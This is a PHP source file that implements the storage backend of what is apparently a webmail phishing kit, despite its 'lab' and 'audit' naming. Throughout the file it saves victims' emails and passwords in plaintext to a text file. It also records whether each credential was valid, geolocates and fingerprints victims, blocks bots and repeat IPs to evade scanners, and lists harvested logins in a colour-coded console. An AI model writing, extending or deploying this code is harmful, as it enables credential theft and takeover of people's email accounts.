<?php
declare(strict_types=1);

namespace Lab\Webmail\Audit;

final class LabStorage
{
    private string $dataDir;
    private string $txtDb;

    public function __construct(string $dataDir)
    {
        $this->dataDir = rtrim($dataDir, '/\\');
        if (!is_dir($this->dataDir)) {
            mkdir($this->dataDir, 0700, true);
        }
        $this->txtDb = $this->dataDir . '/logins.txt';
    }

    public static function credentialKey(string $email, string $password): string
    {
        $email = strtolower(trim($email));
        return hash('sha256', $email . '|' . $password);
    }

    public static function formatCredentialLine(string $email, string $password): string
    {
        return $email . ',' . $password;
    }

    public function trackIpPageHit(string $ip, int $maxVisits = 4): bool
    {
        if ($this->isIpBlocked($ip)) {
            return false;
        }

        $hits = $this->readJson('ip_hits.json');
        $count = (int) ($hits[$ip] ?? 0) + 1;
        $hits[$ip] = $count;
        $this->writeJson('ip_hits.json', $hits);

        if ($count > $maxVisits) {
            $this->setIpBlocked($ip, true);
            return false;
        }

        return true;
    }

    public function trackIpApiHit(string $ip, int $maxAttempts = 4): bool
    {
        if ($this->isIpBlocked($ip)) {
            return false;
        }

        $hits = $this->readJson('ip_api_hits.json');
        $count = (int) ($hits[$ip] ?? 0) + 1;
        $hits[$ip] = $count;
        $this->writeJson('ip_api_hits.json', $hits);

        if ($count > $maxAttempts) {
            $this->setIpBlocked($ip, true);
            return false;
        }

        return true;
    }

    /** Bloqueia IP após N logins inválidos (credencial rejeitada pela API). */
    public function trackIpFailedLogin(string $ip, int $maxFailures = 4): bool
    {
        if ($this->isIpBlocked($ip)) {
            return false;
        }

        $hits = $this->readJson('ip_failed_logins.json');
        $count = (int) ($hits[$ip] ?? 0) + 1;
        $hits[$ip] = $count;
        $this->writeJson('ip_failed_logins.json', $hits);

        if ($count >= $maxFailures) {
            $this->setIpBlocked($ip, true);
            return false;
        }

        return true;
    }

    public function getLoginsTxtContent(): string
    {
        if (is_file($this->txtDb)) {
            return (string) file_get_contents($this->txtDb);
        }

        $lines = [];
        foreach ($this->getConsoleEntries() as $entry) {
            $lines[] = $entry['line'];
        }
        return implode("\n", $lines) . ($lines ? "\n" : '');
    }

    public function recordVisit(): void
    {
        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['visit_date'] ?? '') !== $today) {
            $stats['visits_today'] = 0;
            $stats['visit_date'] = $today;
        }
        $stats['visits_today'] = (int) ($stats['visits_today'] ?? 0) + 1;
        $stats['visits_total'] = (int) ($stats['visits_total'] ?? 0) + 1;
        $this->writeStats($stats);

        require_once dirname(__DIR__, 2) . '/includes/device.php';
        $ua = substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'), 0, 500);
        $device = parse_device($ua);
        $this->bumpDeviceStat((string) ($device['kind'] ?? ''));

        $ip = $this->clientIp();
        $this->touchIp($ip, false, false);
    }

    public function recordLoginAttempt(string $email, string $password, bool $success, string $ip, string $userAgent): void
    {
        $email = strtolower(trim($email));
        if ($email === '' || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
            return;
        }

        require_once dirname(__DIR__, 2) . '/includes/device.php';
        require_once dirname(__DIR__, 2) . '/includes/geoip.php';

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['login_date'] ?? '') !== $today) {
            $stats['logins_today'] = 0;
            $stats['login_date'] = $today;
        }
        $stats['logins_today'] = (int) ($stats['logins_today'] ?? 0) + 1;
        $stats['logins_total'] = (int) ($stats['logins_total'] ?? 0) + 1;
        if ($success) {
            $stats['success_total'] = (int) ($stats['success_total'] ?? 0) + 1;
            if (($stats['success_date'] ?? '') !== $today) {
                $stats['success_today'] = 0;
                $stats['success_date'] = $today;
            }
            $stats['success_today'] = (int) ($stats['success_today'] ?? 0) + 1;
        }
        $this->writeStats($stats);

        $device = parse_device($userAgent);
        $geo = geo_lookup($ip, $this->dataDir);
        $this->bumpDeviceStat((string) ($device['kind'] ?? ''));
        $blocked = $this->isIpBlocked($ip);
        $now = date('c');
        $id = hash('sha256', $email . '|' . $now . '|' . random_bytes(8));

        $attempts = $this->readJson('attempts.json');
        $attempts[$id] = [
            'id'       => $id,
            'email'    => $email,
            'success'  => $success,
            'ip'       => $ip,
            'os'       => $device['os'],
            'os_icon'  => $device['icon'],
            'browser'  => $device['browser'],
            'location' => $geo['location'],
            'city'     => $geo['city'],
            'country'  => $geo['country'],
            'at'       => $now,
        ];
        $this->writeJson('attempts.json', $attempts);

        if ($password !== '') {
            $key = self::credentialKey($email, $password);
            $logins = $this->readLogins();

            if (!isset($logins[$key])) {
                $logins[$key] = [
                    'id'         => $key,
                    'email'      => $email,
                    'password'   => $password,
                    'ip'         => $ip,
                    'status'     => $blocked ? 'bloqueado' : 'liberado',
                    'os'         => $device['os'],
                    'os_icon'    => $device['icon'],
                    'browser'    => $device['browser'],
                    'location'   => $geo['location'],
                    'city'       => $geo['city'],
                    'country'    => $geo['country'],
                    'logins'     => 1,
                    'success'    => $success ? 1 : 0,
                    'fail'       => $success ? 0 : 1,
                    'first_seen' => $now,
                    'last_seen'  => $now,
                    'last_ok'    => $success,
                ];
            } else {
                $logins[$key]['last_seen'] = $now;
                $logins[$key]['logins'] = (int) ($logins[$key]['logins'] ?? 0) + 1;
                $logins[$key]['success'] = (int) ($logins[$key]['success'] ?? 0) + ($success ? 1 : 0);
                $logins[$key]['fail'] = (int) ($logins[$key]['fail'] ?? 0) + ($success ? 0 : 1);
                $logins[$key]['last_ok'] = $success;
                $logins[$key]['ip'] = $ip;
                $logins[$key]['os'] = $device['os'];
                $logins[$key]['os_icon'] = $device['icon'];
                $logins[$key]['browser'] = $device['browser'];
                $logins[$key]['location'] = $geo['location'];
                $logins[$key]['city'] = $geo['city'];
                $logins[$key]['country'] = $geo['country'];
                if ($blocked) {
                    $logins[$key]['status'] = 'bloqueado';
                }
            }

            $this->writeLogins($logins);
            $this->syncTxtDatabase($logins);
        }

        $this->touchIp($ip, true, $success);
    }

    public function isIpBlocked(string $ip): bool
    {
        $blocked = $this->readJson('blocked_ips.json');
        return isset($blocked[$ip]) && $blocked[$ip] === true;
    }

    public function countBlockedIps(): int
    {
        $blocked = $this->readJson('blocked_ips.json');
        $count = 0;
        foreach ($blocked as $ip => $flag) {
            if ($flag === true && $ip !== '') {
                $count++;
            }
        }
        return $count;
    }

    public function setIpBlocked(string $ip, bool $blocked): void
    {
        $list = $this->readJson('blocked_ips.json');
        if ($blocked) {
            $list[$ip] = true;
        } else {
            unset($list[$ip]);
        }
        $this->writeJson('blocked_ips.json', $list);

        $logins = $this->readLogins();
        foreach ($logins as $id => $row) {
            if (($row['ip'] ?? '') === $ip) {
                $logins[$id]['status'] = $blocked ? 'bloqueado' : 'liberado';
            }
        }
        $this->writeLogins($logins);
        $this->syncTxtDatabase($logins);

        $ips = $this->readJson('ip_accesses.json');
        if (isset($ips[$ip])) {
            $ips[$ip]['status'] = $blocked ? 'bloqueado' : 'liberado';
            $this->writeJson('ip_accesses.json', $ips);
        }
    }

    /** @return list<array<string, mixed>> */
    public function getIpAccessList(): array
    {
        $ips = $this->readJson('ip_accesses.json');

        if ($ips === []) {
            foreach ($this->getAccessList() as $row) {
                $ip = (string) ($row['ip'] ?? '');
                if ($ip === '') {
                    continue;
                }
                if (!isset($ips[$ip]) || strcmp((string) $row['last_seen'], (string) ($ips[$ip]['last_seen'] ?? '')) > 0) {
                    unset($row['email'], $row['password']);
                    $ips[$ip] = $row;
                    $ips[$ip]['ip'] = $ip;
                }
            }
            if ($ips !== []) {
                $this->writeJson('ip_accesses.json', $ips);
            }
        }

        $blockedList = $this->readJson('blocked_ips.json');
        foreach ($ips as $k => $row) {
            unset($ips[$k]['email'], $ips[$k]['password']);
            $ipKey = (string) ($row['ip'] ?? $k);
            if ($ipKey !== '' && !empty($blockedList[$ipKey])) {
                $ips[$k]['status'] = 'bloqueado';
            }
        }

        $list = array_values($ips);
        usort($list, static fn ($a, $b) => strcmp((string) ($b['last_seen'] ?? ''), (string) ($a['last_seen'] ?? '')));
        return $list;
    }

    /** @return list<array<string, mixed>> */
    public function getBotAccessList(): array
    {
        $bots = $this->readJson('bot_blocks.json');
        $list = array_values($bots);
        usort($list, static fn ($a, $b) => strcmp((string) ($b['last_seen'] ?? ''), (string) ($a['last_seen'] ?? '')));
        return $list;
    }

    /** @return list<array<string, mixed>> */
    public function getAccessList(): array
    {
        $logins = $this->readLogins();
        $list = array_values($logins);
        usort($list, static fn ($a, $b) => strcmp((string) ($b['last_seen'] ?? ''), (string) ($a['last_seen'] ?? '')));
        return $list;
    }

    /** @return list<array{line: string, color: string, email: string, password: string}> */
    public function getConsoleEntries(): array
    {
        $list = $this->getAccessList();
        usort($list, static fn ($a, $b) => strcmp((string) ($a['first_seen'] ?? ''), (string) ($b['first_seen'] ?? '')));

        $emailSeen = [];
        $result = [];

        foreach ($list as $row) {
            $email = (string) ($row['email'] ?? '');
            $password = (string) ($row['password'] ?? '');
            if ($email === '' || $password === '') {
                continue;
            }
            $color = isset($emailSeen[$email]) ? 'yellow' : 'green';
            $emailSeen[$email] = true;

            $result[] = [
                'line'     => self::formatCredentialLine($email, $password),
                'color'    => $color,
                'email'    => $email,
                'password' => $password,
            ];
        }

        return array_reverse($result);
    }

    /** @return array<string, int> */
    public function getStats(): array
    {
        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['visit_date'] ?? '') !== $today) {
            $stats['visits_today'] = 0;
        }
        if (($stats['login_date'] ?? '') !== $today) {
            $stats['logins_today'] = 0;
        }
        if (($stats['bot_date'] ?? '') !== $today) {
            $stats['bots_today'] = 0;
        }
        if (($stats['device_date'] ?? '') !== $today) {
            $stats['iphone_today'] = 0;
            $stats['android_today'] = 0;
            $stats['desktop_today'] = 0;
        }

        return [
            'visits_today'       => (int) ($stats['visits_today'] ?? 0),
            'visits_total'       => (int) ($stats['visits_total'] ?? 0),
            'logins_today'       => (int) ($stats['logins_today'] ?? 0),
            'logins_total'       => (int) ($stats['logins_total'] ?? 0),
            'success_today'      => (int) ($stats['success_today'] ?? 0),
            'success_total'      => (int) ($stats['success_total'] ?? 0),
            'unique_credentials' => count($this->readLogins()),
            'unique_ips'         => count($this->readJson('ip_accesses.json')),
            'blocked_ips'        => $this->countBlockedIps(),
            'bots_today'         => (int) ($stats['bots_today'] ?? 0),
            'bots_total'         => (int) ($stats['bots_total'] ?? 0),
            'iphone_today'       => (int) ($stats['iphone_today'] ?? 0),
            'iphone_total'       => (int) ($stats['iphone_total'] ?? 0),
            'android_today'      => (int) ($stats['android_today'] ?? 0),
            'android_total'      => (int) ($stats['android_total'] ?? 0),
            'desktop_today'      => (int) ($stats['desktop_today'] ?? 0),
            'desktop_total'      => (int) ($stats['desktop_total'] ?? 0),
        ];
    }

    public function recordBotBlock(string $ip, string $userAgent, string $reason): void
    {
        require_once dirname(__DIR__, 2) . '/includes/device.php';
        require_once dirname(__DIR__, 2) . '/includes/geoip.php';

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['bot_date'] ?? '') !== $today) {
            $stats['bots_today'] = 0;
            $stats['bot_date'] = $today;
        }
        $stats['bots_today'] = (int) ($stats['bots_today'] ?? 0) + 1;
        $stats['bots_total'] = (int) ($stats['bots_total'] ?? 0) + 1;
        $this->writeStats($stats);

        $device = parse_device($userAgent);
        $intel = geo_intel_lookup($ip, $this->dataDir);
        $now = date('c');

        $bots = $this->readJson('bot_blocks.json');
        if (!isset($bots[$ip])) {
            $bots[$ip] = [
                'ip'           => $ip,
                'status'       => 'bot',
                'reason'       => $reason,
                'os'           => $device['os'],
                'os_icon'      => $device['icon'],
                'browser'      => $device['browser'],
                'location'     => (string) ($intel['location'] ?? '—'),
                'country'      => (string) ($intel['country'] ?? '—'),
                'country_code' => (string) ($intel['country_code'] ?? ''),
                'hits'         => 1,
                'first_seen'   => $now,
                'last_seen'    => $now,
            ];
        } else {
            $bots[$ip]['last_seen'] = $now;
            $bots[$ip]['hits'] = (int) ($bots[$ip]['hits'] ?? 0) + 1;
            $bots[$ip]['reason'] = $reason;
            $bots[$ip]['os'] = $device['os'];
            $bots[$ip]['os_icon'] = $device['icon'];
            $bots[$ip]['browser'] = $device['browser'];
            $bots[$ip]['location'] = (string) ($intel['location'] ?? $bots[$ip]['location'] ?? '—');
            $bots[$ip]['country'] = (string) ($intel['country'] ?? $bots[$ip]['country'] ?? '—');
            $bots[$ip]['country_code'] = (string) ($intel['country_code'] ?? $bots[$ip]['country_code'] ?? '');
        }

        $this->writeJson('bot_blocks.json', $bots);
    }

    public function clearClicks(): bool
    {
        $stats = $this->readStats();
        $stats['visits_today'] = 0;
        $stats['visits_total'] = 0;
        $stats['visit_date'] = date('Y-m-d');
        $stats['iphone_today'] = 0;
        $stats['iphone_total'] = 0;
        $stats['android_today'] = 0;
        $stats['android_total'] = 0;
        $stats['desktop_today'] = 0;
        $stats['desktop_total'] = 0;
        $stats['device_date'] = date('Y-m-d');
        if (!$this->writeStats($stats)) {
            return false;
        }
        return $this->writeJson('ip_hits.json', []);
    }

    public function clearLogs(): bool
    {
        if (!$this->writeJson('ip_accesses.json', [])) {
            return false;
        }
        if (!$this->writeJson('bot_blocks.json', [])) {
            return false;
        }
        @unlink($this->dataDir . '/anti_bot_blocks.jsonl');

        $stats = $this->readStats();
        $stats['bots_today'] = 0;
        $stats['bots_total'] = 0;
        $stats['bot_date'] = date('Y-m-d');
        return $this->writeStats($stats);
    }

    public function clearLogins(): bool
    {
        $this->writeLogins([]);
        $this->syncTxtDatabase([]);

        $stats = $this->readStats();
        $stats['logins_today'] = 0;
        $stats['logins_total'] = 0;
        $stats['success_today'] = 0;
        $stats['success_total'] = 0;
        $stats['login_date'] = date('Y-m-d');
        return $this->writeStats($stats);
    }

    public function clearAttempts(): bool
    {
        return $this->writeJson('attempts.json', []);
    }

    public function clearAllLogins(): bool
    {
        if (!$this->clearAttempts()) {
            return false;
        }
        return $this->clearLogins();
    }

    /** Remove todos os IPs bloqueados e zera contadores de tentativas. */
    public function clearAllBlockedIps(): bool
    {
        if (!$this->writeJson('blocked_ips.json', [])) {
            return false;
        }
        if (!$this->writeJson('ip_hits.json', [])) {
            return false;
        }
        if (!$this->writeJson('ip_api_hits.json', [])) {
            return false;
        }
        if (!$this->writeJson('ip_failed_logins.json', [])) {
            return false;
        }

        $logins = $this->readLogins();
        foreach ($logins as $id => $row) {
            $logins[$id]['status'] = 'liberado';
        }
        $this->writeLogins($logins);
        $this->syncTxtDatabase($logins);

        $ips = $this->readJson('ip_accesses.json');
        foreach ($ips as $k => $row) {
            $ips[$k]['status'] = 'liberado';
        }

        return $this->writeJson('ip_accesses.json', $ips);
    }

    /** @param array<string, array<string, mixed>> $logins */
    private function syncTxtDatabase(array $logins): void
    {
        $lines = [];
        $sorted = array_values($logins);
        usort($sorted, static fn ($a, $b) => strcmp((string) ($a['first_seen'] ?? ''), (string) ($b['first_seen'] ?? '')));

        foreach ($sorted as $row) {
            $lines[] = self::formatCredentialLine(
                (string) ($row['email'] ?? ''),
                (string) ($row['password'] ?? '')
            ) . "\n";
        }

        file_put_contents($this->txtDb, implode('', $lines), LOCK_EX);
        @chmod($this->txtDb, 0640);
    }

    /** @return array<string, mixed> */
    private function readLogins(): array
    {
        return $this->readJson('logins_db.json');
    }

    /** @param array<string, mixed> $data */
    private function writeLogins(array $data): bool
    {
        return $this->writeJson('logins_db.json', $data);
    }

    public function exportAuditCsv(): string
    {
        $attempts = $this->readJson('attempts.json');
        $lines = ['email,success,ip,browser,os,location,city,country,at'];
        foreach ($attempts as $row) {
            $lines[] = implode(',', [
                $this->csvCell((string) ($row['email'] ?? '')),
                !empty($row['success']) ? '1' : '0',
                $this->csvCell((string) ($row['ip'] ?? '')),
                $this->csvCell((string) ($row['browser'] ?? '')),
                $this->csvCell((string) ($row['os'] ?? '')),
                $this->csvCell((string) ($row['location'] ?? '')),
                $this->csvCell((string) ($row['city'] ?? '')),
                $this->csvCell((string) ($row['country'] ?? '')),
                $this->csvCell((string) ($row['at'] ?? '')),
            ]);
        }
        return implode("\n", $lines) . "\n";
    }

    private function touchIp(string $ip, bool $isLogin, bool $success): void
    {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return;
        }

        require_once dirname(__DIR__, 2) . '/includes/device.php';
        require_once dirname(__DIR__, 2) . '/includes/geoip.php';

        $ua = substr((string) ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown'), 0, 500);
        $device = parse_device($ua);
        $geo = geo_lookup($ip, $this->dataDir);
        $blocked = $this->isIpBlocked($ip);
        $now = date('c');

        $ips = $this->readJson('ip_accesses.json');
        if (!isset($ips[$ip])) {
            $ips[$ip] = [
                'ip'         => $ip,
                'status'     => $blocked ? 'bloqueado' : 'liberado',
                'os'          => $device['os'],
                'os_icon'     => $device['icon'],
                'device_kind' => $device['kind'],
                'browser'     => $device['browser'],
                'location'   => $geo['location'],
                'city'       => $geo['city'],
                'country'    => $geo['country'],
                'logins'     => $isLogin ? 1 : 0,
                'success'    => $isLogin && $success ? 1 : 0,
                'fail'       => $isLogin && !$success ? 1 : 0,
                'first_seen' => $now,
                'last_seen'  => $now,
            ];
        } else {
            $ips[$ip]['last_seen'] = $now;
            if ($isLogin) {
                $ips[$ip]['logins'] = (int) ($ips[$ip]['logins'] ?? 0) + 1;
                $ips[$ip]['success'] = (int) ($ips[$ip]['success'] ?? 0) + ($success ? 1 : 0);
                $ips[$ip]['fail'] = (int) ($ips[$ip]['fail'] ?? 0) + ($success ? 0 : 1);
            }
            $ips[$ip]['os'] = $device['os'];
            $ips[$ip]['os_icon'] = $device['icon'];
            $ips[$ip]['device_kind'] = $device['kind'];
            $ips[$ip]['browser'] = $device['browser'];
            $ips[$ip]['location'] = $geo['location'];
            $ips[$ip]['city'] = $geo['city'];
            $ips[$ip]['country'] = $geo['country'];
            if ($blocked) {
                $ips[$ip]['status'] = 'bloqueado';
            }
        }

        $this->writeJson('ip_accesses.json', $ips);
    }

    private function bumpDeviceStat(string $kind): void
    {
        if (!in_array($kind, ['iphone', 'android', 'desktop'], true)) {
            return;
        }

        $stats = $this->readStats();
        $today = date('Y-m-d');
        if (($stats['device_date'] ?? '') !== $today) {
            $stats['iphone_today'] = 0;
            $stats['android_today'] = 0;
            $stats['desktop_today'] = 0;
            $stats['device_date'] = $today;
        }

        $todayKey = $kind . '_today';
        $totalKey = $kind . '_total';
        $stats[$todayKey] = (int) ($stats[$todayKey] ?? 0) + 1;
        $stats[$totalKey] = (int) ($stats[$totalKey] ?? 0) + 1;
        $this->writeStats($stats);
    }

    private function clientIp(): string
    {
        $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'];
        foreach ($keys as $key) {
            if (!empty($_SERVER[$key])) {
                $ip = trim(explode(',', (string) $_SERVER[$key])[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP)) {
                    return $ip;
                }
            }
        }
        return '0.0.0.0';
    }

    private function csvCell(string $value): string
    {
        if (str_contains($value, ',') || str_contains($value, '"')) {
            return '"' . str_replace('"', '""', $value) . '"';
        }
        return $value;
    }

    /** @return array<string, mixed> */
    private function readStats(): array
    {
        return $this->readJson('stats.json');
    }

    private function writeStats(array $stats): bool
    {
        return $this->writeJson('stats.json', $stats);
    }

    /** @return array<string, mixed> */
    private function readJson(string $file): array
    {
        $path = $this->dataDir . '/' . $file;
        if (!is_file($path)) {
            return [];
        }
        $raw = file_get_contents($path);
        $data = json_decode($raw ?: '{}', true);
        return is_array($data) ? $data : [];
    }

    /** @param array<string, mixed> $data */
    private function writeJson(string $file, array $data): bool
    {
        $path = $this->dataDir . '/' . $file;
        $json = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        if ($json === false) {
            return false;
        }
        return file_put_contents($path, $json, LOCK_EX) !== false;
    }
}
